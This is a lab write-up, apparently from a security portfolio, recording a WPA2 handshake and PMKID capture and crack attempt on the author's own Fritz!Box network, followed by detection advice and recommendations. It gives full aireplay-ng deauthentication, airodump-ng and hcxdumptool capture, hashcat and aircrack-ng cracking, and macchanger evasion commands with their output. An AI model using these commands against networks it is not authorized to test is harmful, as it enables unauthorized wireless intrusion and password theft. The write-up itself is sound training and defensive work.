# Lab 2 — WiFi Security: WPA2 Handshake Capture & Crack Attempt

![Status](https://img.shields.io/badge/Status-Completed-brightgreen)
![Type](https://img.shields.io/badge/Type-Offensive%20%2F%20Defensive-red)
![Difficulty](https://img.shields.io/badge/Difficulty-Intermediate-orange)

---

## Overview

This lab simulates a **black-box WiFi penetration test** against a home network (Fritz!Box router) using a dedicated Kali Linux machine and an external wireless adapter. The objective was to capture a WPA2 4-way handshake and attempt offline password cracking — while documenting both the attacker and defender perspectives.

> **Scope:** Own home network only. All activities were authorized and performed in a controlled lab environment.
> **AP Filter:** All captures were strictly scoped using `--bssid` filter — only the authorized target AP was targeted at all times. No third-party networks were captured or attacked.

---

## Environment

| Component | Details |
|---|---|
| Attacker Machine | Lenovo ThinkPad X250 — Kali Linux 6.18.12 |
| Wireless Adapter | TP-Link Archer T2U Plus (RTL8821AU) |
| Target AP | AVM Fritz!Box (WPA2-CCMP, Channel 6) |
| SSID | Anonymaus |
| Encryption | WPA2 CCMP PSK |
| Connected Client | Mobile device (MAC: `BE:F8:5A:xx:xx:xx`) |

---

## Tools Used

| Tool | Purpose |
|---|---|
| `airmon-ng` | Enable monitor mode on wireless adapter |
| `airodump-ng` | Wireless reconnaissance & packet capture |
| `aireplay-ng` | Deauthentication attack |
| `aircrack-ng` | Offline WPA2 password cracking |
| `hcxdumptool` | Clientless PMKID capture — directly from AP, no client needed |
| `hcxpcapngtool` | Convert pcapng capture to hashcat-compatible hash format |
| `hashcat` | GPU/CPU accelerated offline hash cracking (22000 mode) |
| `macchanger` | MAC address spoofing (identity evasion) |
| `rockyou.txt` | Wordlist for dictionary attack |

---

## Phase 1: Reconnaissance

### 1.1 Monitor Mode Activation

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan1
```

**Result:**
```
PHY     Interface   Driver          Chipset
phy2    wlan1       rtw88_8821au    TP-Link Archer T2U PLUS [RTL8821AU]
(monitor mode enabled)
```

### 1.2 Wireless Network Scan

```bash
sudo airodump-ng wlan1mon
```

Target identified from surrounding networks:

| BSSID | PWR | CH | ENC | CIPHER | ESSID |
|---|---|---|---|---|---|
| `42:65:DE:04:8A:B9` | -26 | 6 | WPA2 | CCMP | Anonymaus |

### 1.3 Connected Client Discovery

```bash
sudo airodump-ng -c 6 --bssid 42:65:DE:04:8A:B9 -w capture wlan1mon
```

**Connected client detected:**

| BSSID | STATION | PWR |
|---|---|---|
| `42:65:DE:04:8A:B9` | `BE:F8:5A:1C:92:C2` | -27 |

---

## Phase 2: Handshake Capture

### 2.1 Targeted Capture

```bash
sudo airodump-ng -c 6 --bssid 42:65:DE:04:8A:B9 -w /home/holy/capture4 wlan1mon
```

### 2.2 Deauthentication Attack

Sent deauth frames to force client reconnection and trigger WPA2 4-way handshake:

```bash
sudo aireplay-ng --deauth 20 -a 42:65:DE:04:8A:B9 -c BE:F8:5A:1C:92:C2 wlan1mon
```

### 2.3 Handshake Captured ✅

```
WPA handshake: 42:65:DE:04:8A:B9
```

Capture file saved: `capture4-01.cap`

---

## Phase 3: Password Cracking (Attempted)

### 3.1 Dictionary Attack

```bash
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt /home/holy/capture4-01.cap
```

**Result:** Key not found in rockyou.txt (14,344,391 passwords tested)

**Reason:** Target password is long and complex — not present in standard wordlists.

**Observation:** In a real-world scenario, an attacker could escalate to:
- GPU-accelerated cracking with `hashcat`
- Custom wordlists
- Rule-based mutations
- PMKID attack (no client required)

---

## Phase 3.5: PMKID Attack (Clientless)

### Why PMKID?

The classic deauth method requires a connected client. In real-world scenarios, an attacker cannot always wait for a client to connect. The **PMKID attack** (discovered 2018) solves this — it requests the PMKID hash directly from the AP, with no client involvement.

| | Classic Handshake | PMKID |
|---|---|---|
| Client required | ✅ Yes | ❌ No |
| Attack duration | Wait for client | Seconds |
| Detectable | Yes (deauth spike) | Very difficult |
| Internet needed | No | No |

### 3.5.1 hcxdumptool v7.0.0 — No Third Party Monitor Mode

hcxdumptool v7.0.0 manages monitor mode internally. airmon-ng must be stopped first:

```bash
sudo airmon-ng stop wlan1mon
sudo systemctl stop NetworkManager
```

### 3.5.2 PMKID Capture

BSSID filter applied to scope the attack to the authorized target only:

```bash
sudo hcxdumptool -i wlan1 -w /home/holy/pmkid.pcapng --bssid 42:65:DE:04:8A:B9
```

| Parameter | Purpose |
|---|---|
| `--bssid 42:65:DE:04:8A:B9` | Restrict capture to authorized AP only — no other networks targeted |

**Result after ~7 minutes:**
```
377786 packets captured by kernel
92 packets dropped by kernel
```

### 3.5.3 Convert to Hash Format

```bash
hcxpcapngtool -o /home/holy/pmkid.hash /home/holy/pmkid.pcapng
```

**Key output:**
```
ESSID (total unique):              19
RSN PMKID written to hash file:     3
EAPOL pairs written to hash file:   5
Hashes: 8 digests; 6 unique salts
```

> ✅ **Scope Control:** `--bssid` filter was applied — only the authorized target AP was captured. No other networks were targeted.

### 3.5.4 Offline Cracking with Hashcat

```bash
hashcat -m 22000 /home/holy/pmkid.hash /usr/share/wordlists/rockyou.txt --force
```

**Result:**
```
Device:  Intel Core i5-5200U (CPU)
Speed:   3,515 H/s
Time:    ~6 hours 42 minutes
Result:  Key not found — strong password confirmed
```

> **Key Insight:** Cracking is 100% offline — no internet required at any stage.

---

## Phase 4: Identity Evasion (MAC Spoofing)

To remain anonymous during the attack, MAC address should be randomized before initiating capture:

```bash
sudo ip link set wlan1mon down
sudo macchanger -r wlan1mon
sudo ip link set wlan1mon up
macchanger -s wlan1mon
```

**Effect:** Adapter broadcasts with a randomized MAC address — difficult to trace back to real hardware.

> **Note:** Fritz!Box was also observed performing MAC randomization on its BSSID across sessions — a defensive behavior worth noting.

---

## Phase 5: Detection & Response (Defender Perspective)

### 5.1 How Would This Attack Be Detected?

| Detection Method | Description |
|---|---|
| **Deauth frames** | Wireshark filter: `wlan.fc.type_subtype == 0x000c` — sudden deauth spike is a clear indicator |
| **Fritz!Box logs** | Unknown MAC address appears in connected devices log |
| **Signal anomaly** | Sudden client disconnection followed by immediate reconnection |
| **Passive monitoring** | IDS/SIEM alert on mass deauth frames — next lab objective |

### 5.2 Response Actions

```
1. Change WiFi password immediately
2. Enable MAC filtering on Fritz!Box
3. Review connected devices list
4. Enable push notifications for new device connections
5. Consider WPA3 upgrade if supported
```

### 5.3 Fritz!Box Push Service (Quick Win)

```
Fritz!Box → System → Push Service → New WLAN device connected
```
Sends email notification when an unknown device joins the network.

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Description |
|---|---|---|---|
| Reconnaissance | Network Sniffing | T1040 | airodump-ng passive scan |
| Credential Access | Brute Force: Password Cracking | T1110.002 | aircrack-ng / hashcat dictionary attack |
| Credential Access | Network Sniffing (PMKID) | T1040 | hcxdumptool clientless PMKID capture |
| Defense Evasion | Masquerading | T1036 | MAC address spoofing with macchanger |
| Initial Access | Valid Accounts (attempted) | T1078 | WPA2 PSK crack attempt |

---

## Observations & Findings

### Finding 1 — WPA2 Handshake Successfully Captured
**Severity:** High
**Detail:** A 4-way handshake was captured within minutes using standard tooling. Any attacker within RF range can capture this handshake and attempt offline cracking indefinitely.

### Finding 2 — PMKID Captured Without Client
**Severity:** High
**Detail:** Using hcxdumptool, PMKID hashes were captured directly from the AP with no connected client required. This eliminates the need to wait for a client — making the attack faster and harder to detect.

### Finding 3 — Scope Control via BSSID Filter
**Severity:** Informational
**Detail:** hcxdumptool by default captures PMKIDs from all nearby APs. `--bssid` filter was applied throughout this lab to restrict capture to the authorized target only. In real engagements, this is a mandatory ethical and legal requirement.

### Finding 4 — Cracking is Fully Offline
**Severity:** High
**Detail:** Both handshake cracking and PMKID cracking require zero internet connectivity. Attacker can capture hashes in the field and crack them days later on a more powerful machine.

### Finding 5 — Client MAC Randomization
**Severity:** Informational
**Detail:** The connected client uses MAC randomization. This slightly complicates targeted deauth but does not prevent broadcast deauth or PMKID attacks.

### Finding 6 — AP MAC Randomization (Fritz!Box)
**Severity:** Informational
**Detail:** Fritz!Box BSSID changed between sessions. Modern routers increasingly use this as a privacy feature. Does not prevent handshake or PMKID capture.

### Finding 7 — Strong Password Resists Dictionary Attack
**Severity:** Positive Finding
**Detail:** The target password was not present in rockyou.txt (14M entries). Complex, long passphrases provide meaningful resistance against offline dictionary attacks.

---

## Lessons Learned

1. **WPA2 is vulnerable to offline cracking** — the handshake can be captured passively; password strength is the last line of defense.
2. **PMKID eliminates the client requirement** — an attacker does not need to wait for a client; the AP itself leaks the PMKID hash.
3. **Cracking is fully offline** — no internet needed at any stage; hashes can be captured in the field and cracked later on a powerful machine.
4. **Deauth is detectable, PMKID is not** — deauth flood leaves a clear IDS signature; PMKID attack appears as normal association traffic.
5. **Scope control is critical** — hcxdumptool captures ALL nearby networks by default; `--bssid` filter must be used in real engagements.
6. **MAC randomization adds friction** but does not stop attacks — broadcast deauth and PMKID bypass client-specific targeting.
7. **No IDS = no visibility** — without an IDS/SIEM, both attacks went completely undetected in real time.

---

## Recommendations

| Priority | Action |
|---|---|
| 🔴 High | Use WPA3 if router supports it — resistant to offline handshake attacks |
| 🔴 High | Use long, random passphrase (20+ chars) — maximizes cracking resistance |
| 🟡 Medium | Enable Fritz!Box push notifications for new connections |
| 🟡 Medium | Deploy IDS (Snort/Suricata) for real-time detection |
| 🟢 Low | Periodic review of connected devices |
| 🟢 Low | Enable MAC filtering as additional layer |

---



## References

- [Aircrack-ng Documentation](https://www.aircrack-ng.org/documentation.html)
- [MITRE ATT&CK T1040](https://attack.mitre.org/techniques/T1040/)
- [MITRE ATT&CK T1110](https://attack.mitre.org/techniques/T1110/)
- [WPA2 4-Way Handshake — IEEE 802.11i](https://en.wikipedia.org/wiki/IEEE_802.11i-2004)
---

*Lab completed: 2026-03-20 | Author: holy@h4des | Platform: Kali Linux 6.18.12*
